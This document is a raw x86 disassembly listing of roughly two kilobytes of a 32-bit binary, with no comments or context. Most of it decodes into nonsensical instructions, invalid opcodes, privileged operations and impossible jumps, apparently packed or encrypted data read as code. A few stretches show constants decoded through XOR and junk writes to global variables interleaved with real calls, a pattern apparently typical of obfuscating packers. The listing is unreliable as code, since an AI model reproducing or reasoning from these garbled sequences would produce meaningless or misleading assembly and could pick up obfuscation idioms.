  4062ca:	inc    edx
  4062cb:	cwde   
  4062cc:	or     DWORD PTR [esi],0x36
  4062cf:	mov    ds,WORD PTR [esp+edx*8]
  4062d2:	mov    al,0x30
  4062d4:	inc    ebp
  4062d5:	ret    0xbe88
  4062d8:	mov    ebx,0xedcada37
  4062dd:	scas   eax,DWORD PTR es:[edi]
  4062de:	in     al,0xb8
  4062e0:	cmp    ebx,DWORD PTR [edx+ebx*4+0x67abb62e]
  4062e7:	shl    BYTE PTR [eax-0x60ec19fe],1
  4062ed:	mul    edx
  4062ef:	sbb    DWORD PTR [edi],esi
  4062f1:	in     al,0xef
  4062f3:	xchg   ebx,eax
  4062f4:	dec    ebp
  4062f5:	sub    cl,bh
  4062f7:	lock mov esp,cs
  4062fa:	(bad)  
  4062fb:	xlat   BYTE PTR ds:[ebx]
  4062fc:	cmp    DWORD PTR ss:[edi-0x77e9e366],ebp
  406303:	cli    
  406304:	lock add ecx,edx
  406307:	cmp    eax,0xb2e82d39
  40630c:	sub    BYTE PTR [ecx-0x56d305f7],dh
  406312:	in     al,0x77
  406314:	mov    ecx,DWORD PTR [esi]
  406316:	dec    ecx
  406317:	pop    edi
  406318:	les    esi,FWORD PTR [edi]
  40631a:	sbb    bl,dh
  40631c:	xor    DWORD PTR [ebp+eiz*4+0x13],ecx
  406320:	push   eax
  406321:	leave  
  406322:	sti    
  406323:	fdiv   QWORD PTR [ebp-0x30d89e60]
  406329:	mov    dh,0x8a
  40632b:	inc    ebx
  40632c:	sub    BYTE PTR [edx+0x2b],dl
  40632f:	clts   
  406331:	sti    
  406332:	adc    al,bh
  406334:	dec    ebp
  406335:	push   ds
  406336:	mov    eax,0x484344b0
  40633b:	pop    eax
  40633c:	dec    ebx
  40633d:	xor    eax,0x54529d39
  406342:	and    ecx,ebp
  406344:	or     dh,ch
  406346:	out    0x6f,eax
  406348:	mov    BYTE PTR [ecx],0x0
  40634b:	mov    edi,DWORD PTR [edi+0x46]
  40634e:	jecxz  0x40633c
  406350:	pusha  
  406351:	repnz retf 0x58d2
  406355:	fisttp WORD PTR [esi-0x1d18db47]
  40635b:	push   cs
  40635c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40635d:	xchg   DWORD PTR [esi+0x34],esp
  406360:	frstor [ecx+0x53]
  406363:	jo     0x406397
  406365:	out    dx,al
  406366:	add    BYTE PTR ds:0x792b40cc,0xf0
  40636d:	aam    0xb7
  40636f:	rcl    DWORD PTR [ebx-0x22],1
  406372:	jbe    0x406380
  406374:	jbe    0x40634d
  406376:	xor    ebp,DWORD PTR [ecx-0x149257bb]
  40637c:	daa    
  40637d:	jl     0x4063f0
  40637f:	add    al,0x8d
  406381:	mul    DWORD PTR [ecx-0x64]
  406384:	sahf   
  406385:	call   0x10a013c0
  40638a:	outs   dx,DWORD PTR ds:[esi]
  40638b:	ror    BYTE PTR [ebx+0x690eb1a4],1
  406391:	repnz adc al,0x1e
  406394:	xor    esp,ebx
  406396:	test   eax,0x729862bd
  40639b:	jl     0x406321
  40639d:	xor    DWORD PTR [edi-0x5d],ebp
  4063a0:	jbe    0x4063d7
  4063a2:	(bad)  [esi+eiz*8-0x4a]
  4063a6:	push   ebp
  4063a7:	xchg   DWORD PTR [ecx+0x1ccac51b],esi
  4063ad:	sbb    DWORD PTR [edi+0x17],edi
  4063b0:	lock adc DWORD PTR [ebx],0x449f9df
  4063b7:	in     eax,0x1e
  4063b9:	(bad)  
  4063ba:	push   esi
  4063bb:	gs jo  0x406406
  4063be:	fld    QWORD PTR gs:[edi]
  4063c2:	inc    edi
  4063c3:	cmp    BYTE PTR [edx],ah
  4063c5:	aas    
  4063c6:	sub    al,0x34
  4063c8:	inc    edx
  4063c9:	jl     0x4063d3
  4063cb:	jmp    0x456ee6ec
  4063d0:	push   0xffffffab
  4063d2:	out    0xe3,eax
  4063d4:	out    0xed,eax
  4063d6:	xchg   esi,eax
  4063d7:	mov    ah,0xad
  4063d9:	js     0x4063f8
  4063db:	adc    eax,0x795daa3d
  4063e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063e1:	and    eax,0xde7857e
  4063e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063e7:	xchg   edi,eax
  4063e8:	push   0xffffff99
  4063ea:	hlt    
  4063eb:	add    edi,ebx
  4063ed:	mov    esp,0x920e2d82
  4063f2:	sub    BYTE PTR [edi-0x3a],0x80
  4063f6:	popa   
  4063f7:	push   esi
  4063f8:	mov    edx,0xc0d56b81
  4063fd:	and    al,0xb
  4063ff:	jb     0x40647e
  406401:	out    dx,eax
  406402:	stc    
  406403:	mov    al,al
  406405:	xchg   esi,eax
  406406:	test   BYTE PTR [esi-0x6343caec],dl
  40640c:	dec    edx
  40640d:	and    al,0xc3
  40640f:	mov    esp,DWORD PTR [esi-0x7d]
  406412:	pop    esp
  406413:	call   0xbef3:0x8c5b074c
  40641a:	add    esp,0x59
  40641d:	por    mm0,QWORD PTR ds:0x1de395e
  406424:	mov    ecx,0xa457239e
  406429:	test   eax,0x99b6646a
  40642e:	pushf  
  40642f:	mov    WORD PTR [edi],ds
  406431:	dec    edi
  406432:	or     BYTE PTR [edx],ah
  406434:	ret    0x54df
  406437:	sbb    al,0x34
  406439:	dec    edx
  40643a:	mov    DWORD PTR [edi+0x21c404d2],ebx
  406440:	jl     0x4064a5
  406442:	rcl    DWORD PTR [eax+0x458951e7],1
  406448:	loopne 0x4063cb
  40644a:	xor    eax,0x434406
  40644f:	je     0x406478
  406451:	inc    ebx
  406452:	add    bh,al
  406454:	inc    ebp
  406455:	fdiv   DWORD PTR [ecx]
  406457:	mov    ch,0x9c
  406459:	clc    
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432e62,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43441a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432e62,0x432770
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x432770,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432e56,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x43276c,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x4344ad,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x432770,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432e52,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43440e,0x434495
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434406,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432e3e,0x432e66
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434491,0x43449d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434406,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43441a,0x43277c
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fbstp  TBYTE PTR [edi+edi*8+0x9]
  40655b:	sbb    eax,0x70703e6b
  406560:	and    BYTE PTR [ebp+0x70],bh
  406563:	jo     0x406579
  406565:	pop    ebp
  406566:	outs   dx,BYTE PTR ds:[esi]
  406567:	loopne 0x406585
  406569:	mov    al,0xc
  40656b:	rcl    BYTE PTR [ecx],cl
  40656d:	cmp    dl,BYTE PTR [edx]
  40656f:	test   eax,0x55cacb79
  406574:	cwde   
  406575:	ret    0x2992
  406578:	and    ah,dl
  40657a:	and    bl,BYTE PTR ds:0xc9e4ff7
  406580:	fbld   TBYTE PTR [eax]
  406582:	scas   eax,DWORD PTR es:[edi]
  406583:	ds push ebp
  406585:	dec    esp
  406586:	nop
  406587:	inc    ebx
  406588:	mov    bh,0x57
  40658a:	jmp    0x3d94:0x4ab5b7c2
  406591:	cmp    ebp,ebx
  406593:	aaa    
  406594:	or     al,0xbc
  406596:	lea    ebp,[eax-0x18]
  406599:	push   ss
  40659a:	std    
  40659b:	jg     0x4065d8
  40659d:	mov    ds,WORD PTR [eax-0x74]
  4065a0:	xor    BYTE PTR [eax-0x107c61e1],0x6f
  4065a7:	das    
  4065a8:	pop    ebx
  4065a9:	jb     0x40658f
  4065ab:	or     BYTE PTR [edx],dh
  4065ad:	aas    
  4065ae:	mov    ebp,0x674f166c
  4065b3:	sbb    DWORD PTR [ecx+0x745ab97],0x4f1c2862
  4065bd:	adc    BYTE PTR [ebx],dl
  4065bf:	add    DWORD PTR [eax-0x19a19922],ebx
  4065c5:	pop    esi
  4065c6:	inc    ebp
  4065c7:	jnp    0x406642
  4065c9:	xor    al,0xbd
  4065cb:	jp     0x406609
  4065cd:	ss enter 0x1bd6,0x20
  4065d2:	js     0x4065db
  4065d4:	sar    BYTE PTR [esi],0xd
  4065d7:	(bad)  
  4065d9:	xchg   edx,eax
  4065da:	lahf   
  4065db:	mov    dl,0x1
  4065dd:	jo     0x4065d0
  4065df:	hlt    
  4065e0:	adc    eax,0x2c1b51f
  4065e5:	std    
  4065e6:	jb     0x40660a
  4065e8:	neg    DWORD PTR [esi]
  4065ea:	pop    eax
  4065eb:	jns    0x4065e7
  4065ed:	aas    
  4065ee:	or     eax,0x5551a9fc
  4065f3:	add    bl,BYTE PTR [ebp-0x13a34eec]
  4065f9:	dec    ecx
  4065fa:	retf   0x439d
  4065fd:	xor    dl,cl
  4065ff:	cmp    ax,0xf0dc
  406603:	pop    ebx
  406604:	cmp    BYTE PTR [ecx-0x83b346a],0xfd
  40660b:	adc    eax,0x4880864
  406610:	mov    al,BYTE PTR [esi]
  406612:	pop    es
  406613:	lods   eax,DWORD PTR ds:[esi]
  406614:	dec    esi
  406615:	dec    ebp
  406616:	or     esi,DWORD PTR [esi+0x4c]
  406619:	adc    BYTE PTR [ecx],ch
  40661b:	bound  edx,QWORD PTR [edi-0x48]
  40661e:	enter  0x41d4,0xf6
  406622:	push   cs
  406623:	faddp  st(7),st
  406625:	ret    0x5b35
  406628:	ja     0x406644
  40662a:	(bad)  
  40662b:	pop    esp
  40662c:	in     al,0x3c
  40662e:	mov    cl,0xa9
  406630:	(bad)  
  406631:	adc    eax,0xa9f1ba5a
  406636:	lds    edi,FWORD PTR [ebx-0x3c18c365]
  40663c:	adc    eax,ebp
  40663e:	daa    
  40663f:	push   ds
  406640:	adc    edx,ebp
  406642:	in     al,dx
  406643:	sbb    cl,bh
  406645:	sub    ebp,DWORD PTR [edi+0xc2479ed]
  40664b:	aad    0x6c
  40664d:	(bad)  
  40664f:	pop    ss
  406650:	shr    DWORD PTR [edx],1
  406652:	(bad)  
  406653:	retf   0xd16a
  406656:	retf   0x3c5a
  406659:	push   eax
  40665a:	add    dl,al
  40665c:	aas    
  40665d:	gs sbb eax,0xf31c077c
  406663:	cmp    esp,DWORD PTR [ebp+0xa]
  406666:	dec    ecx
  406667:	mov    edi,0x7f2c18d
  40666c:	imul   eax,DWORD PTR [esi],0x8c33b1e
  406672:	pop    ss
  406673:	inc    BYTE PTR [edi+0x7c29db97]
  406679:	adc    bl,BYTE PTR [ecx-0x2c]
  40667c:	test   BYTE PTR [esi-0x27299ae2],al
  406682:	or     BYTE PTR [ebx],al
  406684:	dec    edx
  406685:	and    eax,0xb633ef54
  40668a:	fsub   st,st(2)
  40668c:	bound  esp,QWORD PTR [eax+0x7eb2a9f8]
  406692:	mov    al,0xa1
  406694:	mov    bl,0xfc
  406696:	xor    ebx,0x89f442c0
  40669c:	rcr    BYTE PTR [edx-0x8],cl
  40669f:	add    BYTE PTR [ebx],dl
  4066a1:	inc    esi
  4066a2:	xchg   esi,eax
  4066a3:	mov    dl,bl
  4066a5:	cmp    al,0xbb
  4066a7:	dec    ebp
  4066a8:	sbb    al,al
  4066aa:	sub    bh,dl
  4066ac:	dec    edx
  4066ad:	mov    edx,0xa5b7a0ae
  4066b2:	push   ebx
  4066b3:	jl     0x406640
  4066b5:	loope  0x40666a
  4066b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066b8:	sbb    al,0xf7
  4066ba:	pop    ebx
  4066bb:	push   eax
  4066bc:	inc    edx
  4066bd:	and    DWORD PTR [esi-0x4c65c289],0x3455976c
  4066c7:	aaa    
  4066c8:	mov    BYTE PTR [ecx+0x7e],0x30
  4066cc:	inc    ebp
  4066cd:	dec    edx
  4066ce:	ins    DWORD PTR es:[edi],dx
  4066cf:	int    0x3e
  4066d1:	(bad)  
  4066d2:	sub    eax,0xf5065aee
  4066d7:	pop    ebp
  4066d8:	mov    ebx,0xdbf2de62
  4066dd:	(bad)  
  4066de:	jo     0x40671d
  4066e0:	cmp    ebp,DWORD PTR ds:0x86757f9e
  4066e6:	hlt    
  4066e7:	fwait
  4066e8:	daa    
  4066e9:	(bad)  
  4066ea:	inc    edi
  4066eb:	mov    ch,0xe1
  4066ed:	ja     0x406744
  4066ef:	ins    DWORD PTR es:[edi],dx
  4066f0:	jge    0x406688
  4066f2:	inc    ebp
  4066f3:	(bad)  
  4066f5:	lods   eax,DWORD PTR fs:[esi]
  4066f7:	arpl   si,di
  4066f9:	(bad)  
  4066fa:	js     0x406765
  4066fc:	push   0xec7a546d
  406701:	lods   eax,DWORD PTR ds:[esi]
  406702:	mov    al,0xbd
  406704:	xchg   ecx,eax
  406705:	and    esi,esp
  406707:	fsubp  st(6),st
  406709:	aas    
  40670a:	sbb    BYTE PTR [esi],0xfc
  40670d:	sub    eax,ecx
  40670f:	or     eax,0xdc7f45d5
  406714:	push   es
  406715:	enter  0x74b6,0x5a
  406719:	push   ebx
  40671a:	push   cs
  40671b:	and    BYTE PTR [esi],dh
  40671d:	dec    ebx
  40671e:	xchg   DWORD PTR [edi],edx
  406720:	test   al,0xe2
  406722:	pushf  
  406723:	pop    ss
  406724:	cmp    eax,0xf2d31030
  406729:	neg    ah
  40672b:	call   0xd11d7efa
  406730:	sbb    eax,0x7c2875f5
  406735:	jnp    0x406765
  406737:	ret    0x737d
  40673a:	imul   edi,DWORD PTR [ecx+0xdee3f18],0xe8a58465
  406744:	or     ecx,DWORD PTR ds:0x13d18683
  40674a:	lds    esi,FWORD PTR ds:0x87c1520e
  406750:	ja     0x40679f
  406752:	sar    BYTE PTR [ecx],cl
  406754:	pop    esi
  406755:	sbb    esp,DWORD PTR [ebp-0x7bfab05d]
  40675b:	aam    0xad
  40675d:	pushf  
  40675e:	loopne 0x40670b
  406760:	pop    ebp
  406761:	cpuid  
  406763:	mov    ebp,DWORD PTR [eax+0x37]
  406766:	pop    esp
  406767:	mov    ah,0x73
  406769:	sti    
  40676a:	repnz fld st(7)
  40676e:	push   ds
  40676f:	mov    bh,0x44
  406771:	cdq    
  406772:	ja     0x40675d
  406774:	cmp    eax,0x8f1c6287
  406779:	lods   eax,DWORD PTR ds:[esi]
  40677a:	mov    bl,0x4c
  40677c:	jge    0x40675d
  40677e:	scas   al,BYTE PTR es:[edi]
  40677f:	xlat   BYTE PTR ds:[ebx]
  406780:	daa    
  406781:	ficom  DWORD PTR [ebx+0x66]
  406784:	cmp    esi,ecx
  406786:	mov    eax,0x9f3ce23b
  40678b:	or     dh,cl
  40678d:	(bad)  
  40678e:	fisttp WORD PTR [ecx-0x43]
  406791:	inc    eax
  406792:	inc    ebx
  406793:	cmp    DWORD PTR [eax+esi*8-0x3e],eax
  406797:	mov    fs,WORD PTR ds:0x800907aa
  40679d:	pop    ebp
  40679e:	mov    ah,0x8c
  4067a0:	aam    0x5e
  4067a2:	stos   BYTE PTR es:[edi],al
  4067a3:	mov    edi,0x3d2ed2d4
  4067a8:	and    BYTE PTR [edx-0x16705754],bh
  4067ae:	retf   0x7ba5
  4067b1:	popa   
  4067b2:	or     esp,DWORD PTR [esp+ebp*2]
  4067b5:	inc    ebx
  4067b6:	std    
  4067b7:	mov    ds:0x5a3fb31c,eax
  4067bc:	test   eax,0x5867b6b7
  4067c1:	pop    ss
  4067c2:	dec    esi
  4067c3:	dec    ebx
  4067c4:	aas    
  4067c5:	jns    0x40677c
  4067c7:	loop   0x4067b5
  4067c9:	pop    es
  4067ca:	adc    eax,0x17ca71dd
  4067cf:	mov    ch,BYTE PTR [ebx-0x7d]
  4067d2:	adc    dl,BYTE PTR ds:0x4c7098c0
  4067d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067d9:	dec    edx
  4067da:	lods   al,BYTE PTR ds:[esi]
  4067db:	sub    al,0xc0
  4067dd:	fistp  DWORD PTR [eax+0x5a]
  4067e0:	inc    eax
  4067e1:	sub    dl,BYTE PTR [ecx+0x6119e576]
  4067e7:	lahf   
  4067e8:	int3   
  4067e9:	sub    DWORD PTR [eax+ebp*8+0x2b],esi
  4067ed:	sbb    al,0x48
  4067ef:	mov    WORD PTR [eax+0x30888f31],ds
  4067f5:	or     eax,0xa97468bc
  4067fa:	aad    0x6c
  4067fc:	pusha  
  4067fd:	icebp  
  4067fe:	or     DWORD PTR [ecx-0x5900ae16],0xffffffc7
  406805:	scas   eax,DWORD PTR es:[edi]
  406806:	xchg   ebp,eax
  406807:	jmp    0x3e9d9dd1
  40680c:	mov    ?,ebp
  40680e:	sbb    BYTE PTR [ebp+0x42117a9c],dh
  406814:	push   es
  406815:	and    DWORD PTR [ecx],ecx
  406817:	fld    TBYTE PTR [edx]
  406819:	push   eax
  40681a:	bound  eax,QWORD PTR [edi-0x6516e56b]
  406820:	xor    al,0xbd
  406822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406823:	hlt    
  406824:	and    ch,bh
  406826:	jg     0x40689a
  406828:	(bad)  
  406829:	jg     0x40689c
  40682b:	(bad)  [esi-0x62]
  40682e:	aad    0xd1
  406830:	icebp  
  406831:	inc    ebp
  406832:	ss sbb al,0x2e
  406835:	and    edx,esp
  406837:	cs inc esi
  406839:	dec    esi
  40683a:	mov    cx,0xfb8f
  40683e:	iret   
  40683f:	int    0x39
  406841:	lea    eax,[ebx-0x2c]
  406844:	jo     0x406824
  406846:	cwde   
  406847:	xor    eax,0xd8bc147
  40684c:	imul   eax,DWORD PTR [ecx+ebx*2+0x38],0xffffffde
  406851:	mov    eax,0xfbc37199
  406856:	retf   0xfce5
  406859:	mov    dl,0xfc
  40685b:	xchg   esp,eax
  40685c:	jle    0x40683c
  40685e:	jb     0x40683c
  406860:	dec    edi
  406861:	fldenv [ebp+0x25]
  406864:	ret    0xf278
  406867:	mov    edi,0x72ff1545
  40686c:	sub    bl,cl
  40686e:	xor    eax,0xbb0d7380
  406873:	add    cl,ch
  406875:	loopne 0x4068af
  406877:	mov    ebx,0x5b0c1300
  40687c:	cld    
  40687d:	pop    esi
  40687e:	out    dx,eax
  40687f:	xor    DWORD PTR [ebp-0x57],esp
  406882:	shl    DWORD PTR [esi+0x39],1
  406885:	in     eax,dx
  406886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406887:	adc    DWORD PTR [eax+0x1c],0xfd22aa5c
  40688e:	mov    ebp,0xfef1c93c
  406893:	push   esp
  406894:	test   eax,eax
  406896:	mov    DWORD PTR ds:0x4344a5,0x7971
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432e4a,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432e66,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432e62,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x4343e6,0x11
  4068da:	cmp    DWORD PTR ds:0x4343e6,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x4343e6,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x4344a1
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432cba
  40690c:	cmp    DWORD PTR ds:0x4343e6,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x4343e6
  40691e:	dec    eax
  40691f:	mov    ds:0x4343e6,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x4343e6
  40692c:	dec    eax
  40692d:	mov    ds:0x4343e6,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	dec    ebx
  406990:	mov    edi,ebp
  406992:	aas    
  406993:	sbb    edi,DWORD PTR [edx]
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406987
  40699c:	push   es
  40699d:	outs   dx,BYTE PTR ds:[esi]
  40699e:	mov    WORD PTR [esi],es
  4069a0:	dec    DWORD PTR [esi-0x1d]
  4069a3:	push   ebp
  4069a4:	cmp    BYTE PTR [esi-0x7e24bb8f],0x53
  4069ab:	sub    ecx,DWORD PTR [edi+ebx*8-0x61]
  4069af:	xchg   ebp,eax
  4069b0:	xor    dl,BYTE PTR [esi-0x7d6a0c91]
  4069b6:	adc    edx,esp
  4069b8:	dec    esp
  4069b9:	arpl   bp,bx
  4069bb:	mov    cl,0xae
  4069bd:	sar    dh,cl
  4069bf:	fadd   DWORD PTR [eax+0x7aabd601]
  4069c5:	out    0x20,al
  4069c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069c8:	cmc    
  4069c9:	cmp    al,0xfc
  4069cb:	and    DWORD PTR [edi+eiz*8],ebx
  4069ce:	fimul  WORD PTR [eax+0x18]
  4069d1:	call   0x7240:0xe3f1ca2b
  4069d8:	mov    ch,0xd3
  4069da:	nop
  4069db:	enter  0xd3d,0xd5
  4069df:	jne    0x406a55
  4069e1:	aad    0xcb
  4069e3:	mov    ch,0x8e
  4069e5:	iret   
  4069e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e7:	and    ch,ch
  4069e9:	mov    dl,BYTE PTR [ebx-0x6ab2bba8]
  4069ef:	(bad)  
  4069f0:	pop    eax
  4069f1:	ds pushf 
  4069f3:	nop
  4069f4:	cld    
  4069f5:	sub    ch,BYTE PTR [edx-0x6c]
  4069f8:	and    esp,ecx
  4069fa:	test   eax,0x42e53f23
  4069ff:	jmp    0x63d0:0xe3f36003
  406a06:	fwait
  406a07:	dec    ebx
  406a08:	test   edi,0x2a2727a6
  406a0e:	ret    
  406a0f:	jmp    0xbccbf3e
  406a14:	xor    eax,0xbcca8af8
  406a19:	leave  
  406a1a:	dec    edi
  406a1b:	xor    al,0xa7
  406a1d:	cmp    BYTE PTR [ebx],al
  406a1f:	mov    dh,0xc1
  406a21:	loope  0x406a0a
  406a23:	inc    edx
  406a24:	pop    ds
  406a25:	push   ss
  406a26:	xchg   ebp,eax
  406a27:	dec    ebp
  406a28:	addr16 push esp
  406a2a:	mov    al,ds:0xb66c5d56
  406a2f:	mov    cl,0x19
  406a31:	push   esp
  406a32:	add    BYTE PTR [edi],dh
  406a34:	and    edi,eax
  406a36:	retf   0x6903
  406a39:	sub    al,BYTE PTR [ebp+ebp*2+0x43b7e44f]
  406a40:	call   0x9624:0x186367a0
  406a47:	das    
  406a48:	pushf  
  406a49:	mov    ebp,0x286b143a
  406a4e:	call   edi
  406a50:	mov    ah,0xa0
  406a52:	ss loope 0x406a5b
  406a55:	mov    ebx,0x2ac10966
  406a5a:	int    0x5d
  406a5c:	das    
  406a5d:	out    0xd3,eax
  406a5f:	xchg   esp,esi
  406a61:	lods   al,BYTE PTR ds:[esi]
  406a62:	push   edx
  406a63:	dec    ebp
  406a64:	cld    
  406a65:	push   es
  406a66:	pop    edx
  406a67:	(bad)  
  406a68:	xchg   ecx,eax
  406a69:	fisub  WORD PTR [edx]
  406a6b:	sub    al,BYTE PTR [ecx+0x4a]
  406a6e:	mov    ebx,0x8d0efd9d
  406a73:	and    edi,DWORD PTR [esi+0x1a]
  406a76:	push   ecx
  406a77:	call   FWORD PTR [edi+0x3c]
  406a7a:	sub    esi,edi
  406a7c:	jno    0x406aca
  406a7e:	ins    BYTE PTR es:[edi],dx
  406a7f:	pop    eax
  406a80:	cwde   
  406a81:	lds    ecx,FWORD PTR [eax]
  406a83:	jmp    0x406a45
  406a85:	retf   0xa8e2
  406a88:	imul   esp,ebx,0xfa3a5b0f
  406a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a8f:	retf   
  406a90:	pop    edi
  406a91:	ds pop edx
  406a93:	loop   0x406a67
  406a95:	inc    esp
  406a96:	aam    0x7d
  406a98:	cdq    
  406a99:	and    BYTE PTR [eax-0x79],0x4f
  406a9d:	and    edx,DWORD PTR [ebp+0x1e]
  406aa0:	add    BYTE PTR [eax-0x27],bl
  406aa3:	and    ch,BYTE PTR [ebp-0x4e9114c9]
  406aa9:	jo     0x406b22
  406aab:	push   ds
  406aac:	lock push ss
  406aae:	inc    edi
  406aaf:	retf   0x18f6
  406ab2:	fcomp  DWORD PTR [esp+edx*8-0x2d]
  406ab6:	mov    eax,0xd3e36bcf
  406abb:	pop    edi
  406abc:	icebp  
  406abd:	xor    DWORD PTR [ecx],0xffffffca
  406ac0:	fsubrp st(4),st
  406ac2:	scas   eax,DWORD PTR es:[edi]
  406ac3:	mov    al,ds:0x74eb1590
  406ac8:	and    eax,0x13e3cfe
  406acd:	sbb    DWORD PTR [ebp+0x1],ebp
  406ad0:	sbb    DWORD PTR [edi-0x57],ebx
  406ad3:	mov    cl,0x4
  406ad5:	jle    0x406a5a
  406ad7:	cs ins BYTE PTR es:[edi],dx
  406ad9:	ins    DWORD PTR es:[edi],dx
  406ada:	shr    DWORD PTR [eax],1
  406adc:	inc    edi
  406add:	loop   0x406b1e
  406adf:	pop    eax
  406ae0:	push   cs
  406ae1:	push   ebp
  406ae2:	xor    dh,BYTE PTR ds:0x56e2b6cd
  406ae8:	mov    ds:0x39f00837,al
  406aed:	jne    0x406b11
  406aef:	aas    
  406af0:	rcr    eax,0x8d
  406af3:	scas   eax,DWORD PTR es:[edi]
  406af4:	jns    0x406b59
  406af6:	xchg   esp,eax
  406af7:	out    0xa3,al
  406af9:	jae    0x406abe
  406afb:	sub    bl,BYTE PTR [esi]
  406afd:	mov    cl,0xfe
  406aff:	push   eax
  406b00:	cwde   
  406b01:	aaa    
  406b02:	inc    esi
  406b03:	pop    ebx
  406b04:	adc    esi,DWORD PTR [ebx]
  406b06:	pop    eax
  406b07:	cmp    dl,BYTE PTR [edx+0x1c931015]
  406b0d:	push   0x4d
  406b0f:	dec    ecx
  406b10:	dec    ebp
  406b11:	icebp  
  406b12:	(bad)  
  406b13:	mov    ebp,0x289ba29c
  406b18:	lds    esi,FWORD PTR [eax]
  406b1a:	iret   
  406b1b:	dec    eax
  406b1c:	jle    0x406b52
  406b1e:	fsub   st,st(2)
  406b20:	pop    ebx
  406b21:	push   esi
  406b22:	sbb    eax,0x98f33165
  406b27:	push   esi
  406b28:	adc    dh,ah
  406b2a:	das    
  406b2b:	jp     0x406b6a
  406b2d:	repz sbb bh,BYTE PTR [ebx]
  406b30:	pop    ebp
  406b31:	dec    ebx
  406b32:	pop    es
  406b33:	shl    DWORD PTR ds:0x98e8be27,cl
  406b39:	mov    WORD PTR [ebx-0x3f8786b8],fs
  406b3f:	out    0xca,al
  406b41:	dec    esp
  406b42:	test   al,0x3b
  406b44:	jae    0x406b26
  406b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b47:	jle    0x406add
